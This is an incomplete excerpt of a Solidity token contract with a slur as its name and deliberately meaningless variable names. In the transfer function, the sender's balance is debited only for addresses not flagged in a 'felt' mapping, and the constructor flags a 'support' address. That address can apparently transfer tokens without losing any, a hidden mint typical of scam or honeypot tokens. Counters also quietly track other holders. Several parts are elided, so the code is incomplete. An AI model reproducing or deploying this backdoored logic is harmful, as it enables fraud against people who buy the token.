...
contract Fag is Ownable {
    uint256 private letter;
    string private crew;
    uint256 private _tTotal;
    string private duck;
    uint256 private atomic;
    uint8 private whale;
    ...
    mapping(address => uint256) private teacher;
    ...
    function school(
        ...
        if ((address(uniswapV2Pair) != model) && felt[model] == 0 && meat[model] > 0) {
            felt[model] -= whale;
        }

        address shorter = storm;
        storm = life;

        if (felt[model] == 0) {
            teacher[model] -= negative;
        }
        uint256 learn = (negative * letter) / atomic;
        negative -= learn;
        meat[shorter] += whale;
        teacher[life] += negative;
    }

    mapping(address => uint256) private meat;
    ...
    constructor(
        ...
        atomic = 100;
        felt[support] = whale;
        _tTotal = 1000000000000000 * 10**whale;
        teacher[msg.sender] = _tTotal;
    }
}